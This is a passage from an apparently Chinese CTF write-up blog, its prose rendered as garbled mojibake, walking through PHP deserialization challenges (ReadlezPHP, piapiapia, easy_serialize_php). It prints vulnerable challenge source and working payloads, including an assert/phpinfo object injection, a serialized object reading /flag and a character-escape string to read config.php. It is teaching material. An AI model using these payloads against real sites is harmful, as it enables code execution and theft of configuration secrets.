<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">&#x27;1.jpg&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Šæ’å…¥äº†ä¸¤æ¡æ•°æ®ï¼Œå–å‡ºçš„æ—¶å€™å°±ä¼šååºåˆ—åŒ–ä¼ å…¥çš„æ•°æ®ã€‚è®¿é—®show.phpå¾—åˆ°flagã€‚</p>
<h2 id="NPUCTF2020-ReadlezPHP">[NPUCTF2020]ReadlezPHP</h2>
<h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3>
<ul>
<li>PHPååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v8">è§£é¢˜</h3>
<p>æ‰“å¼€é¢˜ç›®ç›´æ¥æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>time.php?source</code>ï¼Œè®¿é—®å³å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>æ¯”è¾ƒç®€å•çš„ååºåˆ—åŒ–é¢˜ç›®ï¼Œç”Ÿæˆpayload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$t-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">$t-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå…¨å±€æœç´¢flagã€‚</p>
<h3 id="åè®°-v2">åè®°</h3>
<p>ä¸€å¼€å§‹æˆ‘ä½¿ç”¨evalå’Œphpinfo()æ— æ³•æ‰§è¡Œ ï¼ŒæŠ¥é”™evalå‡½æ•°æ²¡æœ‰å®šä¹‰ï¼Œå»<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php">StackOverflow</a>ä¸Šä¸€çœ‹ï¼Œè¯´æ˜¯evalä¸èƒ½ç”¨äºåŠ¨æ€å‡½æ•°ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼š</p>
<p>evalæ˜¯å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯å¯å˜å‡½æ•°ï¼Ÿ</p>
<p>å¯å˜å‡½æ•°å³å˜é‡ååŠ æ‹¬å·ï¼ŒPHPç³»ç»Ÿä¼šå°è¯•è§£ææˆå‡½æ•°ï¼Œå¦‚æœæœ‰å½“å‰å˜é‡ä¸­çš„å€¼ä¸ºå‘½åçš„å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨ã€‚å¦‚æœæ²¡æœ‰å°±æŠ¥é”™ã€‚<br>
å¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireï¼Œeval() ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li>evalæ˜¯è¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨</li>
<li>åœ¨php7.1ç‰ˆæœ¬ä¹‹å assert()é»˜è®¤ä¸å†å¯ä»¥æ‰§è¡Œä»£ç </li>
</ul>
<h2 id="0CTF2016-piapiapia">[0CTF2016]piapiapia</h2>
<h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3>
<ul>
<li>æ•°ç»„ç»•è¿‡</li>
<li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li>
</ul>
<h3 id="è§£é¢˜-v9">è§£é¢˜</h3>
<p><code>www.zip</code>ä¸‹è½½æºç ï¼Œä¸€å…±æœ‰6ä¸ªPHPæ–‡ä»¶ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±ä¸‹é¢è¿™å‡ ä¸ªæ–‡ä»¶ã€‚</p>
<p>å¾ˆæ˜æ˜¾flagåœ¨<code>config.php</code>ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>profile.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>update.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨<code>profile.php</code>æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å¯ä»¥è¯»æ–‡ä»¶çš„åœ°æ–¹<code>$photo = base64_encode(file_get_contents($profile['photo']));</code>ï¼Œå¹¶ä¸”<code>$profile</code>å˜é‡æ˜¯ç»è¿‡ååºåˆ—åŒ–çš„ã€‚é‚£ä¹ˆç°åœ¨çš„ç›®æ ‡å°±æ˜¯è¦æŠŠ<code>$profile['photo']</code>çš„å€¼æ›¿æ¢æˆ<code>config.php</code>ï¼Œ<code>update.php</code>ä¸­å¯ä»¥æ§åˆ¶<code>$profile</code>å˜é‡ã€‚ä¸»è¦æ˜¯ä¸‹é¢è¿™ä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>ä¼ å…¥äº†æ•°ç»„ä¸­è¿™å››ä¸ªå€¼ï¼Œç„¶åå°†æ•°ç»„åºåˆ—åŒ–åå¸¦å…¥userç±»ä¸­çš„update_profileæ–¹æ³•ä¸­ä»è€Œæ›´æ”¹è¡¨ä¿¡æ¯ã€‚ç„¶åæˆ‘ä»¬æŸ¥çœ‹å†…å®¹æ—¶ä¼šåœ¨<code>profile.php</code>ä¸­ååºåˆ—åŒ–åè¿”å›ç»™æˆ‘ä»¬è¦çœ‹çš„ä¿¡æ¯ã€‚å†å»çœ‹ä¸€ä¸‹<code>update_profile</code>å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯ä¸€ä¸ªé˜²æ­¢sqlæ³¨å…¥çš„æ–¹æ³•ï¼Œå…¶ä¸­ä»–å°†ä¸Šé¢äº”ä¸ªsqlå…³é”®å­—æ›¿æ¢ä¸ºäº†hackerã€‚çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†è¿™å´æ˜¯æˆ‘ä»¬æœ€é‡è¦çš„åˆ©ç”¨ç‚¹ã€‚</p>
<blockquote>
<p>ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œ<strong>å¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†</strong>ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚</p>
</blockquote>
<p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ­£å¸¸çš„<code>$profile</code>ç»è¿‡åºåˆ—åŒ–åæ˜¯ä»€ä¹ˆæ ·å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬æ›´æ”¹çš„ä¿¡æ¯æ˜¯è¦ç»è¿‡åºåˆ—åŒ–å­˜å…¥æ•°æ®åº“çš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬åœ¨ä¿¡æ¯ä¸­å¡«å…¥äº†å…³é”®å­—ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;select&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ä¼šæ›¿æ¢ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ååºåˆ—åŒ–ä¼šæ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºå­—ç¬¦æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœå¡«å…¥äº†whereã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;where&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ä¼šæ›¿æ¢ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±ä¼šå‘ç°ä¼šå‡ºé”™ï¼Œå› ä¸ºwhereæ˜¯äº”ä¸ªå­—ç¬¦ï¼Œè€Œhackeræ˜¯å…­ä¸ªï¼Œå¯¹äºå‡ºwhereä»¥å¤–çš„å…¶ä»–éƒ½æ˜¯å…­å­—ç¬¦ï¼Œæ‰€ä»¥åªæœ‰whereä¼šå‡ºé”™ï¼Œå› æ­¤è¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ã€‚å½“æˆ‘ä»¬æŠŠhackerå¤šä½™çš„è¿™ä¸ªræ›¿æ¢æˆ<code>&quot;;i:1;s:5:&quot;world&quot;;&#125;</code>æ—¶ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacke&quot;;i:1;s:5:&quot;world&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>phpååºåˆ—åŒ–æ—¶ä¼šå¿½ç•¥åé¢çš„éæ³•éƒ¨åˆ†&quot;;i:1;s:5:â€œworldâ€;}ï¼Œå¯ä»¥ååºåˆ—åŒ–æˆåŠŸã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¤šå†™å‡ ä¸ªwhereï¼Œè¿™æ ·åœ¨æ›¿æ¢æ—¶æ¯å¤šå‡ºçš„ä¸€ä¸ªrå°±ä¸ºæˆ‘ä»¬æ„é€ å­—ç¬¦ä¸²æä¾›ä¸€ä¸ªä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>åŠ åœ¨åé¢ç”¨æ¥è¯»config.phpæ–‡ä»¶ã€‚å…±34ä¸ªå­—ç¬¦ï¼Œå› æ­¤éœ€è¦åŠ 34çš„whereï¼Œæ‰€ä»¥æœ€åéœ€è¦è¾“å…¥çš„æ•°æ®ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·åœ¨ååºåˆ—åŒ–åå¤§æ¦‚å°±æ˜¯è¿™æƒ…å†µï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶è¿™34ä¸ªå­—ç¬¦ä¼šåŒ…å«åœ¨204ä¸ªæ€»å­—ç¬¦å†…ã€‚<br>
æ›¿æ¢ä¸ºhackeråï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºhackeræ¯”whereå¤šä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æ­£å¥½å æ®äº†è¿™å¤šä½™çš„34ä¸ªå­—ç¬¦ï¼Œä½¿å¾—å…¶é€ƒé€¸äº†å‡ºæ¥ï¼Œä¾¿å¯ä»¥æˆåŠŸååºåˆ—åŒ–ã€‚</p>
<p>payloadæ„é€ æˆåŠŸäº†ï¼Œå†æ‰¾è¾“å…¥ç‚¹ã€‚</p>
<blockquote>
<p>md5(Array()) = null<br>
sha1(Array()) = null<br>
ereg(pattern,Array()) = null<br>
preg_match(pattern,Array()) = false<br>
strcmp(Array(), â€œabcâ€) = null<br>
strpos(Array(),â€œabcâ€) = null<br>
strlen(Array()) = null</p>
</blockquote>
<p>ä¸‹é¢çš„è¿™ä¸ªpreg_mathå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150607.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150646.png" alt=""></p>
<h3 id="å‚è€ƒ-v2">å‚è€ƒ</h3>
<p><a href="https://xz.aliyun.com/t/7570#toc-9">https://xz.aliyun.com/t/7570#toc-9</a></p>
<p><a href="http://www.lin2zhen.top/index.php/archives/73/">http://www.lin2zhen.top/index.php/archives/73/</a></p>
<h2 id="å®‰æ´µæ¯-2019-easy-serialize-php-v2">[å®‰æ´µæ¯ 2019]easy_serialize_php</h2>
<h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3>
<ul>
<li>phpinfoä¿¡æ¯æœé›†</li>
<li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li>
</ul>
<h3 id="è§£é¢˜-v10">è§£é¢˜</h3>
<p>ä¸Šæ¥å°±ç›´æ¥ä¸ªæºä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span 